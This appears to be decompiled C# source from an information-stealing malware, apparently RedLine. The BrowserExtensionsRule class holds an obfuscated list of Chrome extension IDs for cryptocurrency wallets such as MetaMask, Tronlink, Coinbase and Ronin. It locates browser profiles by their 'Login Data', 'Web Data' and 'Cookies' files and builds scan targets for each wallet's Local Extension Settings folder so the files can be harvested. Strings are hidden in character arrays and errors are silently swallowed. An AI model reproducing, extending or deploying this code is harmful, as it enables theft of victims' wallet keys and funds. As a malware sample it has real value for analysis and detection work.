using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000015 RID: 21
public class BrowserExtensionsRule : FileScannerRule
{
	// Token: 0x06000056 RID: 86 RVA: 0x0000502C File Offset: 0x0000322C
	public void SetPaths(IList<string> browserPaths)
	{
		this.BrowserPaths = new List<string>(browserPaths ?? new List<string>());
		this.ExtensionNames = new Dictionary<string, string>
		{
			{
				new string(new char[]
				{
					'f',
					'f',
					'n',
					'b',
					'e',
					'l',
					'f',
					'd',
					'o',
					'e',
					'i',
					'o',
					'h',
					'e',
					'n',
					'k',
					'j',
					'i',
					'b',
					'n',
					'm',
					'a',
					'd',
					'j',
					'i',
					'e',
					'h',
					'j',
					'h',
					'a',
					'j',
					'b'
				}),
				new string(new char[]
				{
					'Y',
					'o',
					'r',
					'o',
					'i',
					'W',
					'a',
					'l',
					'l',
					'e',
					't'
				})
			},
			{
				"ibnejdfjmmkpcnlpebklmnkoeoihofec",
				"Tronlink"
			},
			{
				"jbdaocneiiinmjbjlgalhcelgbejmnid",
				"NiftyWallet"
			},
			{
				"nkbihfbeogaeaoehlefnkodbefgpgknn",
				"Metamask"
			},
			{
				"afbcbjpbpfadlkmhmclhkeeodmamcflc",
				"MathWallet"
			},
			{
				"hnfanknocfeofbddgcijnmhnfnkdnaad",
				"Coinbase"
			},
			{
				"fhbohimaelbohpjbbldcngcnapndodjp",
				"BinanceChain"
			},
			{
				"odbfpeeihdkbihmopkbjmoonfanlbfcl",
				"BraveWallet"
			},
			{
				"hpglfhgfnhbgpjdenjgmdgoeiappafln",
				"GuardaWallet"
			},
			{
				"blnieiiffboillknjnepogjhkgnoapac",
				"EqualWallet"
			},
			{
				"cjelfplplebdjjenllpjcblmjkfcffne",
				"JaxxxLiberty"
			},
			{
				"fihkakfobkmkjojpchpfgcmhfjnmnfpi",
				"BitAppWallet"
			},
			{
				"kncchdigobghenbbaddojjnnaogfppfj",
				"iWallet"
			},
			{
				"amkmjjmmflddogmhpjloimipbofnfjih",
				"Wombat"
			},
			{
				new string(new char[]
				{
					'f',
					'h',
					'i',
					'l',
					'a',
					'h',
					'e',
					'i',
					'm',
					'g',
					'l',
					'i',
					'g',
					'n',
					'd',
					'd',
					'k',
					'j',
					'g',
					'o',
					'f',
					'k',
					'c',
					'b',
					'g',
					'e',
					'k',
					'h',
					'e',
					'n',
					'b',
					'h'
				}),
				new string(new char[]
				{
					'A',
					't',
					'o',
					'm',
					'i',
					'c',
					'W',
					'a',
					'l',
					'l',
					'e',
					't'
				})
			},
			{
				new string(new char[]
				{
					'n',
					'l',
					'b',
					'm',
					'n',
					'n',
					'i',
					'j',
					'c',
					'n',
					'l',
					'e',
					'g',
					'k',
					'j',
					'j',
					'p',
					'c',
					'f',
					'j',
					'c',
					'l',
					'm',
					'c',
					'f',
					'g',
					'g',
					'f',
					'e',
					'f',
					'd',
					'm'
				}),
				new string(new char[]
				{
					'M',
					'e',
					'w',
					'C',
					'x'
				})
			},
			{
				new string(new char[]
				{
					'n',
					'a',
					'n',
					'j',
					'm',
					'd',
					'k',
					'n',
					'h',
					'k',
					'i',
					'n',
					'i',
					'f',
					'n',
					'k',
					'g',
					'd',
					'c',
					'g',
					'g',
					'c',
					'f',
					'n',
					'h',
					'd',
					'a',
					'a',
					'm',
					'm',
					'm',
					'j'
				}),
				new string(new char[]
				{
					'G',
					'u',
					'i',
					'l',
					'd',
					'W',
					'a',
					'l',
					'l',
					'e',
					't'
				})
			},
			{
				new string(new char[]
				{
					'n',
					'k',
					'd',
					'd',
					'g',
					'n',
					'c',
					'd',
					'j',
					'g',
					'j',
					'f',
					'c',
					'd',
					'd',
					'a',
					'm',
					'f',
					'g',
					'c',
					'm',
					'f',
					'n',
					'l',
					'h',
					'c',
					'c',
					'n',
					'i',
					'm',
					'i',
					'g'
				}),
				new string(new char[]
				{
					'S',
					'a',
					't',
					'u',
					'r',
					'n',
					'W',
					'a',
					'l',
					'l',
					'e',
					't'
				})
			},
			{
				new string(new char[]
				{
					'f',
					'n',
					'j',
					'h',
					'm',
					'k',
					'h',
					'h',
					'm',
					'k',
					'b',
					'j',
					'k',
					'k',
					'a',
					'b',
					'n',
					'd',
					'c',
					'n',
					'n',
					'o',
					'g',
					'a',
					'g',
					'o',
					'g',
					'b',
					'n',
					'e',
					'e',
					'c'
				}),
				new string(new char[]
				{
					'R',
					'o',
					'n',
					'i',
					'n',
					'W',
					'a',
					'l',
					'l',
					'e',
					't'
				})
			}
		};
	}

	// Token: 0x06000058 RID: 88 RVA: 0x00005264 File Offset: 0x00003464
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		foreach (KeyValuePair<string, string> keyValuePair in this.ExtensionNames)
		{
			if (filePath.Directory.FullName.Contains(keyValuePair.Key))
			{
				return scannerArg.Tag;
			}
		}
		return "UnknownExtension";
	}

	// Token: 0x06000059 RID: 89 RVA: 0x000052DC File Offset: 0x000034DC
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			new List<string>();
			foreach (string baseDirectory in from x in this.BrowserPaths
			select Environment.ExpandEnvironmentVariables(x))
			{
				foreach (string text in FileCopier.FindPaths(baseDirectory, 1, 1, new string[]
				{
					new string(new char[]
					{
						'L',
						'o',
						'g',
						'i',
						'n',
						' ',
						'D',
						'a',
						't',
						'a'
					}),
					new string(new char[]
					{
						'W',
						'e',
						'b',
						' ',
						'D',
						'a',
						't',
						'a'
					}),
					new string(new char[]
					{
						'C',
						'o',
						'o',
						'k',
						'i',
						'e',
						's'
					})
				}))
				{
					try
					{
						string text2 = string.Empty;
						string text3 = string.Empty;
						text2 = new FileInfo(text).Directory.FullName;
						if (text2.Contains(new string(new char[]
						{
							'O',
							'p',
							'e',
							'r',
							'a',
							' ',
							'G',
							'X',
							' ',
							'S',
							't',
							'a',
							'b',
							'l',
							'e'
						})))
						{
							text3 = new string(new char[]
							{
								'O',
								'p',
								'e',
								'r',
								'a',
								' ',
								'G',
								'X'
							});
						}
						else
						{
							text3 = (text.Contains(Environment.ExpandEnvironmentVariables(new string(new char[]
							{
								'%',
								'U',
								'S',
								'E',
								'R',
								'P',
								'E',
								'n',
								'v',
								'i',
								'r',
								'o',
								'n',
								'm',
								'e',
								'n',
								't',
								'R',
								'O',
								'F',
								'I',
								'L',
								'E',
								'%',
								'\\',
								'A',
								'p',
								'p',
								'D',
								'E',
								'n',
								'v',
								'i',
								'r',
								'o',
								'n',
								'm',
								'e',
								'n',
								't',
								'a',
								't',
								'a',
								'\\',
								'R',
								'o',
								'a',
								'E',
								'n',
								'v',
								'i',
								'r',
								'o',
								'n',
								'm',
								'e',
								'n',
								't',
								'm',
								'i',
								'n',
								'g'
							}).Replace("Environment", string.Empty))) ? FileCopier.ChromeGetRoamingName(text2) : FileCopier.ChromeGetLocalName(text2));
						}
						if (!string.IsNullOrEmpty(text3))
						{
							text3 = text3[0].ToString().ToUpper() + text3.Remove(0, 1);
							string text4 = FileCopier.ChromeGetName(text2);
							if (!string.IsNullOrEmpty(text4))
							{
								foreach (KeyValuePair<string, string> keyValuePair in this.ExtensionNames)
								{
									list.Add(new FileScannerArg
									{
										Pattern = "*",
										Tag = string.Concat(new string[]
										{
											text3,
											"_",
											text4,
											"_",
											keyValuePair.Value
										}),
										Recoursive = false,
										Directory = Path.Combine(text2, "Local Extension Settings", keyValuePair.Key)
									});
								}
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x04000010 RID: 16
	private List<string> BrowserPaths;

	// Token: 0x04000011 RID: 17
	private Dictionary<string, string> ExtensionNames;
}
